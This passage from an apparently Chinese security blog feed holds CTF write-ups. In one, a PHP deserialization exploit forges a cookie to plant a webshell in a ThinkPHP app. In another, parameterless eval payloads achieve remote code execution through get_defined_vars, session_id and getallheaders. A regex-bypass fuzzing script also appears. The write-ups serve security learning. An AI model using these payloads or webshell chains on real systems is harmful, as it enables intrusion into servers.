<span class="number">1</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>Index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $profile;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $profile_db;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"index"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"upload"</span>);</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"img"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"home"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $profile=cookie(<span class="string">'user'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]))&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        cookie(<span class="string">"user"</span>,<span class="keyword">null</span>);</span></span><br><span class="line"><span class="php">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>接下来我们开始分析源码<br>首先我们题目入手时应该寻找可控的输入点，经过一番寻找后，在index.php中发现了cookie的反序列化操作<br><img src="https://upload-images.jianshu.io/upload_images/13385151-af170becce9d136b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p><p>cookie是我们可以控制的，所以可以以此为突破口进行进一步分析，题目登陆后有文件上传功能，我们重点看一下Profile.php中的代码<br>在upload_img()函数中，发现了如下代码段<br><img src="https://upload-images.jianshu.io/upload_images/13385151-bf333befc23d01f4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.jpg"><br>当全局变量$_FILES 不为空时，我们上传的文件会先保存为临时文件，然后在复制到upload文件夹下，这里会注意到，由于filename_tmp和filename均为public属性，我们可以控制这两个变量，将临时文件控制为我们想要上传的木马文件<br>接下来我们要做的事就是触发upload_img函数，继续分析源码注意到Register.php中的destruct方法<br><img src="https://upload-images.jianshu.io/upload_images/13385151-055b845bf9ac96bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>在这里我们同样可以控制checker为Profile类的一个对象，这样由于Profile中没有index方法，就会触发Profile中的<strong>call方法<br><img src="https://upload-images.jianshu.io/upload_images/13385151-3a60637afcfe7405.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>在</strong>call方法中我们注意到</p><pre><code>$this-&gt;{$name}相当于$this-&gt;index</code></pre><p>这样进而会触发__get方法<br><img src="https://upload-images.jianshu.io/upload_images/13385151-92a473306d6aea37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>同样对于expect我们是可以控制的，我们可以控制expect为upload_img进而调用该函数达到恶意文件的生成<br>最后我们来看upload_img函数，我们需要绕过两个判断<br><img src="https://upload-images.jianshu.io/upload_images/13385151-be6c514af8312d53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>这两处相对来说比较简单了，checker是可控的，我们直接置0就可以了，对于第二个if我们在利用时不用上传文件所以就直接绕过了<br>最后梳理一下反序列化利用链</p><pre><code>__destruct()--&gt;__call()--&gt;__get()--&gt;upload_img()</code></pre><h1 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h1><p>注册账号，登录，然后制作图片马上传，得到我们要copy”临时文件”的路径<br><img src="https://upload-images.jianshu.io/upload_images/13385151-8f79b9129a7fe81f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-75e33117a150f99a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>然后经过上面的分析我们可以构造出如下的漏洞利用代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename_tmp;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $upload_menu;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $ext;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $img;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $except;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $registed;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$yml = <span class="keyword">new</span> Register();</span></span><br><span class="line"><span class="php">$yml-&gt;registed=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">$yml-&gt;checker=<span class="keyword">new</span> Profile();</span></span><br><span class="line"><span class="php">$yml-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span></span><br><span class="line"><span class="php">$yml-&gt;checker-&gt;checker=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">$yml-&gt;checker-&gt;ext=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">$yml-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/a7a3cba0eead18324c8b3e2f013dea71/97fa7719c9699fdb67790374376816ba.png"</span>;</span></span><br><span class="line"><span class="php">$yml-&gt;checker-&gt;filename=<span class="string">"./upload/a7a3cba0eead18324c8b3e2f013dea71/yemoli.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> base64_encode(serialize($yml));</span></span><br></pre></td></tr></table></figure></p><p>我们需要修改cookie的值，所以base64编码一下<br><img src="https://upload-images.jianshu.io/upload_images/13385151-358147a2a393243e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>成功的生成的我们需要的一句话<br><img src="https://upload-images.jianshu.io/upload_images/13385151-639d738016015774.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"></p><p>蚂蚁连接一下<br><img src="https://upload-images.jianshu.io/upload_images/13385151-fa66c4aa8e8dbb26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉如果对于魔法函数熟悉的话，题目上手不会太难，后续计划总结一下各个魔法函数的特性，这样对于反序列化题目会更得心应手一些。</p><p>参考链接：<br><a href="https://chxing.xyz/2019/05/27/QWB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">https://chxing.xyz/2019/05/27/QWB反序列化</a></p><p><a href="https://altman.vip/2019/05/27/QWB2019-writeup/" target="_blank" rel="noopener">https://altman.vip/2019/05/27/QWB2019-writeup/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;端午假期没什么事情，想着复现下强网的题目，正好前两天朋友给了个题目复现环境，想着好好总结一下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:/
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数实现RCE</title>
    <link href="https://yml-sec.top/2019/05/24/PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0RCE/"/>
    <id>https://yml-sec.top/2019/05/24/PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0RCE/</id>
    <published>2019-05-24T11:09:43.000Z</published>
    <updated>2019-05-24T11:10:19.913Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。</p><h1 id="示例背景"><a href="#示例背景" class="headerlink" title="示例背景"></a>示例背景</h1><p>以codebreaking的phplimit题目为例，我们以实现RCE为目的来进行分析</p><p>题目代码</p><pre><code>&lt;?phpif(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) {        eval($_GET[&apos;code&apos;]);} else {    show_source(__FILE__);}</code></pre><p>首先我们简单分析下正则部分</p><p>[^\W]的意思是包括所有数字字母和下划线，而((?R)?)表示重复进行整个模式</p><p>这意味着我们需要输入可以循环嵌套的字符串，也就意味着如果我们输入一个有参数的函数，将不会成功的匹配正则</p><p>所以输入点我们虽然可以输入函数，但是不能输入有参数的函数</p><p>下面讨论下bypass的方法</p><h1 id="nginx下的利用"><a href="#nginx下的利用" class="headerlink" title="nginx下的利用"></a>nginx下的利用</h1><h2 id="基于get-defined-vars-函数的利用"><a href="#基于get-defined-vars-函数的利用" class="headerlink" title="基于get_defined_vars()函数的利用"></a>基于get_defined_vars()函数的利用</h2><p>我们看一下该函数的官方文档</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-f834531b62ea2927.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p><p>我们可以通过定义新的变量来控制该函数的返回值</p><p>例如下面这样</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-57121e63315ee829.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.jpg"></p><pre><code>array(4) { [&quot;_GET&quot;]=&gt; array(2) { [&quot;yml&quot;]=&gt; string(4) &quot;cool&quot; [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; } [&quot;_POST&quot;]=&gt; array(0) { } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { } } </code></pre><p>我们可以使cool变成我们想要执行的代码，例如phpinfo();</p><pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(get_defined_vars());</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-893bbb955f44a26a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.jpg"></p><p>然后我们现在要想办法将我们想执行的代码从数组中提取出来</p><p>用到下面几个函数</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-47f9139ed80722f8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.jpg"></p><p>先用current函数取出get键值所对应的值</p><pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(current(get_defined_vars()));</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-915b380d7774c4d3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.jpg"></p><p>然后再利用array_values函数</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-4cf59868f32f29a7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.jpg"></p><p>将数组的值重新组成一个数组</p><pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(array_values(current(get_defined_vars())));</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-e4de269cf910cb9e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.jpg"></p><p>再次利用current函数取出数组第一个值</p><pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(current(array_values(current(get_defined_vars()))));</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-c81a4de3916e513f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.jpg"></p><p>将var_dump改成eval即可实现RCE</p><pre><code>http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=eval(current(array_values(current(get_defined_vars()))));</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-6e664ee6d2ac5169.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.jpg">        </p><h2 id="控制header头某些参数"><a href="#控制header头某些参数" class="headerlink" title="控制header头某些参数"></a>控制header头某些参数</h2><p>我们可以控制header的某些参数来实现恶意代码的传输，这时我们需要利用code参数来传入一个获取header属性值的函数</p><p>head头中最常见的属性就是cookie了，我们可以利用session_id()这个函数</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-909f0566162f24d7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.jpg"></p><p>我们可以控制sessionid的值，然后用session_id()来获取sessionid</p><p>由于sessionid格式的限制，我们可以将想控制的参数转为16进制，然后在code处使用hex2bin函数将16进制数转字符串函数即可</p><p>我们实际测试一下</p><p>首先将phpinfo();转成16进制数</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-ed442311a16d53ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.jpg"></p><p>然后请求URL</p><pre><code>http://127.0.0.1/demo5.php?code=eval(hex2bin(session_id()));</code></pre><p>抓包修改cookie为phpinfo()的16进制</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-1d3f65faa1f4e291.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.jpg"></p><p>发现并没有执行phpinfo()</p><p>仔细分析我们的利用方式，通过对session机制的深入了解，在w3school发现了这个</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-4a2ef551aa52a5e5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.jpg"></p><p>此时更改我们请求的URL为</p><pre><code>http://127.0.0.1/demo5.php?code=eval(hex2bin(session_id(session_start())));</code></pre><p>再次进行上述操作，成功实现RCE</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-d91f2b2131292966.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.jpg"></p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-b43a8accde32d946.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.jpg"></p><h1 id="apache下的利用"><a href="#apache下的利用" class="headerlink" title="apache下的利用"></a>apache下的利用</h1><p>当web服务器为apache时，nginx下的函数虽不能用，但是我们可以使用同样的思路，通过控制head头参数来实现RCE</p><p>我们可以使用getallheaders函数，来看一下官方文档</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-c63322a2bda1b0e2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.jpg"></p><p>实际测试一下</p><pre><code>http://127.0.0.1/demo5.php?code=var_dump(getallheaders());</code></pre><p>返回信息</p><pre><code>array(8) {  [&quot;Host&quot;]=&gt;  string(9) &quot;127.0.0.1&quot;  [&quot;User-Agent&quot;]=&gt;  string(73) &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;  [&quot;Accept&quot;]=&gt;  string(63) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;  [&quot;Accept-Language&quot;]=&gt;  string(35) &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;  [&quot;Accept-Encoding&quot;]=&gt;  string(13) &quot;gzip, deflate&quot;  [&quot;DNT&quot;]=&gt;  string(1) &quot;1&quot;  [&quot;X-Forwarded-For&quot;]=&gt;  string(9) &quot;127.0.0.1&quot;  [&quot;Connection&quot;]=&gt;  string(10) &quot;keep-alive&quot;}</code></pre><p>这样我们可以尝试控制host的值来传入我们的命令，如phpinfo();</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-91e92135c3e0c088.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.jpg"></p><p>为了将phpinfo();取出来，我们可以使用current函数</p><pre><code>http://127.0.0.1/demo5.php?code=var_dump(current(getallheaders()));</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-f47f34f825db61a8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.jpg"></p><p>将var_dump()改为eval()即实现RCE</p><pre><code>http://127.0.0.1/demo5.php?code=eval(current(getallheaders()));</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/13385151-d2426cdaefddd78c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.jpg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然刚入手这一部分的知识感觉理解上很吃力，但是经过自己反复实际操作后，也弄清楚了很多细节，理清背景思路后回头思考会发现并没有那么困难，这也引发了我的一些思考，我们在平时学习某一块的知识时，不应该光看不做，只有实际操作后才会弄清很多细节，深刻理解这些技巧的精髓。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。&lt;/p&gt;
&lt;h1 id=&quot;示例背景&quot;&gt;&lt;a href=&quot;#示例背景&quot; 
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking-function</title>
    <link href="https://yml-sec.top/2019/05/14/code-breaking-function/"/>
    <id>https://yml-sec.top/2019/05/14/code-breaking-function/</id>
    <published>2019-05-14T09:57:05.000Z</published>
    <updated>2019-05-14T10:36:32.583Z</updated>
    
    <content type="html"><![CDATA[<p>本篇属于我的代码审计学习系列</p><h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>题目代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action(<span class="string">''</span>, $arg);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="bypass正则"><a href="#bypass正则" class="headerlink" title="bypass正则"></a>bypass正则</h2><p>题目中提供了两个可控的参数，但是我们需要绕过正则的限制，如何bypass正则我们可以进行字符fuzz测试</p><p><img src="https://upload-images.jianshu.io/upload_images/13385151-4ae16977d2eb3f5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">  j = hex(i)[<span class="number">2</span>:]</span><br><span class="line">  payload = <span class="string">"%"</span>+j</span><br><span class="line">  #print(payload)</span><br><span class="line">  url = <span class="string">"http://127.0.0.1/demo8.php?action="</span>+payload+<span class="string">"var_dump&amp;arg=yml"</span></span><br><span class="line">  <span class="selector-tag">html</span> = requests.get(url)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">"yml"</span> <span class="keyword">in</span> <span class="selector-tag">html</span><span class="selector-class">.text</span>:</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/13385151-eb9121b2b76fa442.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 